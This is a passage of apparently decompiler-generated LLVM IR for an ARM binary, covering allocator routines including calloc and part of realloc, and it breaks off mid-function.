  uselistorder i32 %v0_12bd8, { 1, 0 }
  uselistorder i32 %v6_12bb4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12ba0, { 2, 1, 0 }
  uselistorder i32 %v0_12b88, { 1, 0 }
  uselistorder i32 %v2_12b44, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12b40, { 1, 0 }
  uselistorder i32 %v3_12b18, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_12af8, { 1, 0, 2 }
  uselistorder i32 %v2_12ae0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12a88, { 2, 1, 0 }
  uselistorder i32 %v6_12a7c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12a58, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12a18, { 1, 0, 2, 3 }
  uselistorder i32 %v0_129d8, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_129d0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_129cc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_129b8, { 1, 0 }
  uselistorder i32 %v7_12978, { 1, 0 }
  uselistorder i32 %v4_12978, { 1, 0 }
  uselistorder i32 %v0_12948, { 1, 0 }
  uselistorder i32 %v2_1291c, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1291857, { 1, 0 }
  uselistorder i32 %v1_128e4, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_128cc., { 1, 2, 0 }
  uselistorder i32 %v0_128d4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_128d4, { 1, 0 }
  uselistorder i32 %v3_128b4, { 1, 0 }
  uselistorder i32 %v4_128b0, { 1, 0, 2 }
  uselistorder i32 %v1_12820, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12878, { 1, 0 }
  uselistorder i32 %v1_1285c, { 1, 0 }
  uselistorder i32 %v1_126fc, { 1, 0 }
  uselistorder i32 %v0_1283c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_12804, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12898.pre, { 1, 2, 0 }
  uselistorder i32 %v0_127e0, { 2, 1, 0 }
  uselistorder i32 %v3_127d4, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_126f4, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1279c, { 1, 0 }
  uselistorder i32 %v3_12790, { 1, 0 }
  uselistorder i32 %v0_1279c, { 1, 0 }
  uselistorder i32 %v3_12774, { 0, 2, 3, 1 }
  uselistorder i32 %v2_12764, { 1, 0, 2 }
  uselistorder i32 %v3_1271c, { 2, 1, 0 }
  uselistorder i32 %v0_1270c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_126dc, { 1, 0 }
  uselistorder i32 %v1_12690, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1268c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_12630, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_12624, { 1, 0 }
  uselistorder i32 %v3_125f4, { 1, 0 }
  uselistorder i32 %v0_125e8, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_125c8, { 0, 2, 1, 3 }
  uselistorder i1 %v7_125bc, { 1, 0 }
  uselistorder i32 %v0_1258c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 43, 40, 41, 42, 44, 45, 46, 47, 109, 110, 48, 49, 50, 51, 52, 53, 54, 55, 56, 61, 57, 58, 59, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 81, 89, 76, 77, 78, 79, 80, 82, 83, 84, 85, 0, 86, 87, 88, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_12e34, { 1, 0 }
  uselistorder label %dec_label_pc_12e18, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12e14, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12dfc, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_12d90, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12d0c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_12d04, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12bd8, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_12b0c, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_129c4, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_12918, { 1, 0 }
  uselistorder label %dec_label_pc_12920.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_128e4, { 1, 0 }
  uselistorder label %dec_label_pc_12898, { 1, 0 }
  uselistorder label %dec_label_pc_1282c, { 1, 0 }
  uselistorder label %dec_label_pc_12828, { 1, 0 }
  uselistorder label %dec_label_pc_127d4, { 1, 0 }
  uselistorder label %dec_label_pc_127c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12788, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12774, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_12e48(i32 %arg1) local_unnamed_addr {
dec_label_pc_12e48:
  %v0_12e48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12e48, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12e48
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12e48, %bb
  %v4_12e64 = phi i32 [ %arg1, %dec_label_pc_12e48 ], [ 0, %bb ]
  ret i32 %v4_12e64

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_12e68 = load i32, i32* @r4, align 4
  %v6_12e68 = load i32, i32* @r5, align 4
  %v9_12e68 = load i32, i32* @r6, align 4
  %v12_12e68 = load i32, i32* @lr, align 4
  %v2_12e70 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12e80 = mul i32 %arg2, %arg1
  store i32 %v2_12e80, i32* @r6, align 4
  br i1 %v2_12e70, label %dec_label_pc_12eb8, label %dec_label_pc_12e88

dec_label_pc_12e88:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_12e90 = udiv i32 %v2_12e80, %arg1
  %v9_12e94 = icmp eq i32 %v2_12e90, %arg2
  br i1 %v9_12e94, label %dec_label_pc_12eb8, label %dec_label_pc_12e9c

dec_label_pc_12e9c:                               ; preds = %dec_label_pc_12e88
  %v0_12ea0 = call i32 @__aeabi_read_tp()
  %v3_12ea4 = load i16, i16* @global_var_2229c.359, align 2
  %v4_12ea4 = sext i16 %v3_12ea4 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12eb0 = add i32 %v4_12ea4, %v0_12ea0
  %v4_12eb0 = inttoptr i32 %v3_12eb0 to i32*
  store i32 12, i32* %v4_12eb0, align 4
  br label %dec_label_pc_12f7c

dec_label_pc_12eb8:                               ; preds = %dec_label_pc_12e88, %entry
  %v4_12ebc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 108) to i32*), align 4
  store i32 %v4_12ebc, i32* @r4, align 4
  %v4_12ed4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 112) to i32*), align 4
  store i32 %v4_12ed4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12ed4)
  %v0_12ee8 = load i32, i32* @r5, align 4
  %v2_12ee8 = add i32 %v0_12ee8, 16
  %v3_12ee8 = inttoptr i32 %v2_12ee8 to i32*
  %v4_12ee8 = load i32, i32* %v3_12ee8, align 4
  store i32 %v4_12ee8, i32* %ip.global-to-local, align 4
  store i32 77556, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12ee8)
  %v0_12ef4 = load i32, i32* @r6, align 4
  store i32 %v0_12ef4, i32* @r0, align 4
  %v0_12ef8 = call i32 @malloc()
  store i32 %v0_12ef8, i32* %r4.global-to-local, align 4
  %v2_12efc = icmp eq i32 %v0_12ef8, 0
  br i1 %v2_12efc, label %.thread, label %dec_label_pc_12f04

dec_label_pc_12f04:                               ; preds = %dec_label_pc_12eb8
  %v1_12f04 = add i32 %v0_12ef8, -4
  %v2_12f04 = inttoptr i32 %v1_12f04 to i32*
  %v3_12f04 = load i32, i32* %v2_12f04, align 4
  %v1_12f08 = and i32 %v3_12f04, 2
  %v2_12f08 = icmp eq i32 %v1_12f08, 0
  br i1 %v2_12f08, label %dec_label_pc_12f10, label %.thread

dec_label_pc_12f10:                               ; preds = %dec_label_pc_12f04
  %v1_12f106 = add i32 %v3_12f04, -4
  %v1_12f14 = and i32 %v1_12f106, -4
  %v3_12f18 = udiv i32 %v1_12f14, 4
  store i32 %v3_12f18, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_12f14, 36
  %v2_12f20 = icmp ult i32 %v1_12f14, 33
  %v3_12f20 = or i1 %tmp, %v2_12f20
  br i1 %v3_12f20, label %dec_label_pc_12f2c, label %dec_label_pc_12f24

dec_label_pc_12f24:                               ; preds = %dec_label_pc_12f10
  %v3_12f24 = inttoptr i32 %v0_12ef8 to i8*
  %v4_12f24 = call i32 @__GI_memset(i8* %v3_12f24, i32 0, i32 %v1_12f14)
  br label %.thread

dec_label_pc_12f2c:                               ; preds = %dec_label_pc_12f10
  %tmp7 = icmp eq i32 %v1_12f14, 16
  %v2_12f30 = inttoptr i32 %v0_12ef8 to i32*
  store i32 0, i32* %v2_12f30, align 4
  %v1_12f34 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f34 = add i32 %v1_12f34, 4
  %v3_12f34 = inttoptr i32 %v2_12f34 to i32*
  store i32 0, i32* %v3_12f34, align 4
  %v1_12f38 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f38 = add i32 %v1_12f38, 8
  %v3_12f38 = inttoptr i32 %v2_12f38 to i32*
  store i32 0, i32* %v3_12f38, align 4
  %v2_12f3c = icmp ult i32 %v1_12f14, 13
  %v3_12f3c = or i1 %tmp7, %v2_12f3c
  br i1 %v3_12f3c, label %.thread, label %dec_label_pc_12f40

dec_label_pc_12f40:                               ; preds = %dec_label_pc_12f2c
  %v0_12f40 = load i32, i32* %ip.global-to-local, align 4
  %v1_12f44 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f44 = add i32 %v1_12f44, 12
  %v3_12f44 = inttoptr i32 %v2_12f44 to i32*
  store i32 0, i32* %v3_12f44, align 4
  %v1_12f48 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f48 = add i32 %v1_12f48, 16
  %v3_12f48 = inttoptr i32 %v2_12f48 to i32*
  store i32 0, i32* %v3_12f48, align 4
  %tmp8 = icmp ult i32 %v0_12f40, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_12f50

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12f40
  %v0_12f50 = load i32, i32* %ip.global-to-local, align 4
  %v7_12f50 = icmp eq i32 %v0_12f50, 9
  %v1_12f54 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f54 = add i32 %v1_12f54, 20
  %v3_12f54 = inttoptr i32 %v2_12f54 to i32*
  store i32 0, i32* %v3_12f54, align 4
  %v1_12f58 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f58 = add i32 %v1_12f58, 24
  %v3_12f58 = inttoptr i32 %v2_12f58 to i32*
  store i32 0, i32* %v3_12f58, align 4
  br i1 %v7_12f50, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12f50
  %v2_12f5c = load i32, i32* %r4.global-to-local, align 4
  %v3_12f5c = add i32 %v2_12f5c, 32
  %v4_12f5c = inttoptr i32 %v3_12f5c to i32*
  store i32 0, i32* %v4_12f5c, align 4
  %v2_12f60 = load i32, i32* %r4.global-to-local, align 4
  %v3_12f60 = add i32 %v2_12f60, 28
  %v4_12f60 = inttoptr i32 %v3_12f60 to i32*
  store i32 0, i32* %v4_12f60, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12f50, %dec_label_pc_12f04, %dec_label_pc_12f40, %dec_label_pc_12f2c, %dec_label_pc_12eb8, %dec_label_pc_12f24, %bb
  store i32 1, i32* @r1, align 4
  %v0_12f70 = load i32, i32* @r5, align 4
  %v2_12f70 = add i32 %v0_12f70, 44
  %v3_12f70 = inttoptr i32 %v2_12f70 to i32*
  %v4_12f70 = load i32, i32* %v3_12f70, align 4
  store i32 %v4_12f70, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12f70)
  br label %dec_label_pc_12f7c

dec_label_pc_12f7c:                               ; preds = %dec_label_pc_12e9c, %.thread
  %v0_12f7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_12e68, i32* @r4, align 4
  store i32 %v6_12e68, i32* @r5, align 4
  store i32 %v9_12e68, i32* @r6, align 4
  store i32 %v12_12e68, i32* @lr, align 4
  ret i32 %v0_12f7c

; uselistorder directives
  uselistorder i32 %v1_12f14, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_12ef8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 8, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12f7c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12fa8 = load i32, i32* @r4, align 4
  %v6_12fa8 = load i32, i32* @r5, align 4
  %v9_12fa8 = load i32, i32* @r6, align 4
  %v12_12fa8 = load i32, i32* @r7, align 4
  %v15_12fa8 = load i32, i32* @r8, align 4
  %v18_12fa8 = load i32, i32* @sb, align 4
  %v21_12fa8 = load i32, i32* @sl, align 4
  %v24_12fa8 = load i32, i32* @fp, align 4
  %v27_12fa8 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12fb4 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12fb4, label %dec_label_pc_12fc8, label %dec_label_pc_12fd8

dec_label_pc_12fc8:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_12fcc = call i32 @malloc()
  store i32 %v0_12fcc, i32* %r0.global-to-local, align 4
  store i32 %v0_12fcc, i32* @r4, align 4
  br label %dec_label_pc_13338

dec_label_pc_12fd8:                               ; preds = %entry
  %v2_12fd8 = icmp eq i32 %arg2, 0
  br i1 %v2_12fd8, label %dec_label_pc_12fe0, label %dec_label_pc_12fec

dec_label_pc_12fe0:                               ; preds = %dec_label_pc_12fd8
  %v0_12fe0 = call i32 @free()
  store i32 %v0_12fe0, i32* %r0.global-to-local, align 4
  %v0_12fe4 = load i32, i32* @r6, align 4
  store i32 %v0_12fe4, i32* @r4, align 4
  br label %dec_label_pc_13338

dec_label_pc_12fec:                               ; preds = %dec_label_pc_12fd8
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_12ff4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 108) to i32*), align 4
  store i32 %v4_12ff4, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_12ff4, i32* %r2.global-to-local, align 4
  %v4_13000 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 68) to i32*), align 4
  store i32 %v4_13000, i32* %r1.global-to-local, align 4
  %v2_13004 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13004, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_1300c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1300c)
  %v0_13018 = load i32, i32* @r4, align 4
  store i32 %v0_13018, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r1.global-to-local, align 4
  %v4_13024 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_13030.471 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13024)
  %v0_13030 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_13030, -32
  br i1 %tmp36, label %dec_label_pc_13054, label %dec_label_pc_13038

dec_label_pc_13038:                               ; preds = %dec_label_pc_12fec
  store i32 62036, i32* %r2.global-to-local, align 4
  %v0_1303c = call i32 @__aeabi_read_tp()
  store i32 %v0_1303c, i32* %r0.global-to-local, align 4
  %v3_13040 = load i16, i16* @global_var_2229c.359, align 2
  %v4_13040 = sext i16 %v3_13040 to i32
  store i32 %v4_13040, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_1304c = add i32 %v4_13040, %v0_1303c
  %v4_1304c = inttoptr i32 %v3_1304c to i32*
  store i32 12, i32* %v4_1304c, align 4
  br label %dec_label_pc_13338

dec_label_pc_13054:                               ; preds = %dec_label_pc_12fec
  %v1_13054 = add i32 %v0_13030, 11
  store i32 %v1_13054, i32* %r0.global-to-local, align 4
  %v0_13058 = load i32, i32* @r5, align 4
  %v1_13058 = add i32 %v0_13058, -4
  %v2_13058 = inttoptr i32 %v1_13058 to i32*
  %v3_13058 = load i32, i32* %v2_13058, align 4
  store i32 %v3_13058, i32* %r2.global-to-local, align 4
  %v2_1305c = icmp ugt i32 %v1_13054, 14
  %v7_1305c = icmp eq i32 %v1_13054, 15
  %v2_13060 = xor i1 %v2_1305c, true
  %v3_13060 = or i1 %v7_1305c, %v2_13060
  br i1 %v3_13060, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_13054
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_13054, %bb
  %v2_13064 = xor i1 %v7_1305c, true
  %v3_13064 = and i1 %v2_1305c, %v2_13064
  br i1 %v3_13064, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_13064 = and i32 %v1_13054, -8
  store i32 %v5_13064, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_13068 = and i32 %v3_13058, 2
  %v2_13068 = icmp eq i32 %v1_13068, 0
  %v1_1306c = add i32 %v0_13058, -8
  store i32 %v1_1306c, i32* @sl, align 4
  %v1_13070 = and i32 %v3_13058, -4
  store i32 %v1_13070, i32* @r6, align 4
  br i1 %v2_13068, label %dec_label_pc_13078, label %dec_label_pc_13250

dec_label_pc_13078:                               ; preds = %bb29
  %v1_13078 = load i32, i32* @sb, align 4
  %v3_13078 = icmp ult i32 %v1_13070, %v1_13078
  br i1 %v3_13078, label %dec_label_pc_13084, label %bb30

bb30:                                             ; preds = %dec_label_pc_13078
  store i32 %v1_13070, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131e8

dec_label_pc_13084:                               ; preds = %dec_label_pc_13078
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1308c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_1308c, i32* %r0.global-to-local, align 4
  %v1_13090 = add i32 %v4_1308c, 44
  %v2_13090 = inttoptr i32 %v1_13090 to i32*
  %v3_13090 = load i32, i32* %v2_13090, align 4
  store i32 %v3_13090, i32* %r3.global-to-local, align 4
  %v2_13094 = add i32 %v1_13070, %v1_1306c
  store i32 %v2_13094, i32* @r4, align 4
  %v9_13098 = icmp eq i32 %v2_13094, %v3_13090
  %v1_1309c = add i32 %v2_13094, 4
  %v2_1309c = inttoptr i32 %v1_1309c to i32*
  %v3_1309c = load i32, i32* %v2_1309c, align 4
  store i32 %v3_1309c, i32* %r1.global-to-local, align 4
  br i1 %v9_13098, label %dec_label_pc_130a4, label %dec_label_pc_130e0

dec_label_pc_130a4:                               ; preds = %dec_label_pc_13084
  %v1_130a4 = and i32 %v3_1309c, -4
  %v2_130a8 = add i32 %v1_130a4, %v1_13070
  store i32 %v2_130a8, i32* %r1.global-to-local, align 4
  %v1_130ac = add i32 %v1_13078, 16
  store i32 %v1_130ac, i32* %r3.global-to-local, align 4
  %v3_130b0 = icmp ult i32 %v2_130a8, %v1_130ac
  br i1 %v3_130b0, label %dec_label_pc_13134, label %dec_label_pc_130b8

dec_label_pc_130b8:                               ; preds = %dec_label_pc_130a4
  %v2_130b8 = sub i32 %v2_130a8, %v1_13078
  %v1_130bc = urem i32 %v3_13058, 2
  %v2_130c0 = add i32 %v1_13078, %v1_1306c
  store i32 %v2_130c0, i32* %r1.global-to-local, align 4
  %v2_130c4 = or i32 %v1_13078, %v1_130bc
  store i32 %v2_130c4, i32* %r2.global-to-local, align 4
  %v1_130c8 = or i32 %v2_130b8, 1
  store i32 %v1_130c8, i32* %r3.global-to-local, align 4
  store i32 %v0_13058, i32* @r4, align 4
  store i32 %v2_130c4, i32* %v2_13058, align 4
  %v0_130d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_130d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_130d4 = add i32 %v1_130d4, 44
  %v3_130d4 = inttoptr i32 %v2_130d4 to i32*
  store i32 %v0_130d4, i32* %v3_130d4, align 4
  %v0_130d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_130d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_130d8 = add i32 %v1_130d8, 4
  %v3_130d8 = inttoptr i32 %v2_130d8 to i32*
  store i32 %v0_130d8, i32* %v3_130d8, align 4
  br label %dec_label_pc_1331c

dec_label_pc_130e0:                               ; preds = %dec_label_pc_13084
  %v1_130e0 = and i32 %v3_1309c, -2
  %v2_130e4 = add i32 %v1_130e0, %v2_13094
  store i32 %v2_130e4, i32* %r3.global-to-local, align 4
  %v1_130e8 = add i32 %v2_130e4, 4
  %v2_130e8 = inttoptr i32 %v1_130e8 to i32*
  %v3_130e8 = load i32, i32* %v2_130e8, align 4
  store i32 %v3_130e8, i32* %r3.global-to-local, align 4
  %v1_130ec = urem i32 %v3_130e8, 2
  %v2_130ec = icmp eq i32 %v1_130ec, 0
  br i1 %v2_130ec, label %dec_label_pc_130f4, label %dec_label_pc_13134

dec_label_pc_130f4:                               ; preds = %dec_label_pc_130e0
  %v1_130f4 = and i32 %v3_1309c, -4
  store i32 %v1_130f4, i32* %r3.global-to-local, align 4
  %v2_130f8 = add i32 %v1_130f4, %v1_13070
  store i32 %v2_130f8, i32* %r0.global-to-local, align 4
  %v3_130fc = icmp ult i32 %v2_130f8, %v1_13078
  br i1 %v3_130fc, label %dec_label_pc_13134, label %dec_label_pc_13104

dec_label_pc_13104:                               ; preds = %dec_label_pc_130f4
  %v1_13104 = add i32 %v1_13070, %v0_13058
  %v2_13104 = inttoptr i32 %v1_13104 to i32*
  %v3_13104 = load i32, i32* %v2_13104, align 4
  store i32 %v3_13104, i32* %r1.global-to-local, align 4
  %v1_13108 = add i32 %v3_13104, 12
  %v2_13108 = inttoptr i32 %v1_13108 to i32*
  %v3_13108 = load i32, i32* %v2_13108, align 4
  store i32 %v3_13108, i32* %r3.global-to-local, align 4
  %v9_1310c = icmp eq i32 %v3_13108, %v2_13094
  %v1_13110 = add i32 %v2_13094, 12
  %v2_13110 = inttoptr i32 %v1_13110 to i32*
  %v3_13110 = load i32, i32* %v2_13110, align 4
  store i32 %v3_13110, i32* %r2.global-to-local, align 4
  br i1 %v9_1310c, label %dec_label_pc_13118, label %dec_label_pc_13124

dec_label_pc_13118:                               ; preds = %dec_label_pc_13104
  %v1_13118 = add i32 %v3_13110, 8
  %v2_13118 = inttoptr i32 %v1_13118 to i32*
  %v3_13118 = load i32, i32* %v2_13118, align 4
  store i32 %v3_13118, i32* %r3.global-to-local, align 4
  %v9_1311c = icmp eq i32 %v3_13118, %v2_13094
  br i1 %v9_1311c, label %dec_label_pc_13128, label %dec_label_pc_13124

dec_label_pc_13124:                               ; preds = %dec_label_pc_13104, %dec_label_pc_13118
  %v0_13124 = call i32 @abort()
  store i32 %v0_13124, i32* %r0.global-to-local, align 4
  %v0_13128.pre = load i32, i32* @r1, align 4
  %v1_13128.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13128

dec_label_pc_13128:                               ; preds = %dec_label_pc_13118, %dec_label_pc_13124
  %v1_13128 = phi i32 [ %v3_13110, %dec_label_pc_13118 ], [ %v1_13128.pre, %dec_label_pc_13124 ]
  %v0_13128 = phi i32 [ %v3_13104, %dec_label_pc_13118 ], [ %v0_13128.pre, %dec_label_pc_13124 ]
  %v2_13128 = add i32 %v1_13128, 8
  %v3_13128 = inttoptr i32 %v2_13128 to i32*
  store i32 %v0_13128, i32* %v3_13128, align 4
  %v0_1312c = load i32, i32* %r2.global-to-local, align 4
  %v1_1312c = load i32, i32* %r1.global-to-local, align 4
  %v2_1312c = add i32 %v1_1312c, 12
  %v3_1312c = inttoptr i32 %v2_1312c to i32*
  store i32 %v0_1312c, i32* %v3_1312c, align 4
  %v1_131e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131e8

dec_label_pc_13134:                               ; preds = %dec_label_pc_130a4, %dec_label_pc_130f4, %dec_label_pc_130e0
  %v1_13134 = add i32 %v1_13078, -7
  store i32 %v1_13134, i32* @r0, align 4
  %v0_13138 = call i32 @malloc()
  store i32 %v0_13138, i32* @r0, align 4
  store i32 %v0_13138, i32* %r1.global-to-local, align 4
  %v2_1313c = icmp eq i32 %v0_13138, 0
  br i1 %v2_1313c, label %bb31, label %dec_label_pc_13148

bb31:                                             ; preds = %dec_label_pc_13134
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1331c

dec_label_pc_13148:                               ; preds = %dec_label_pc_13134
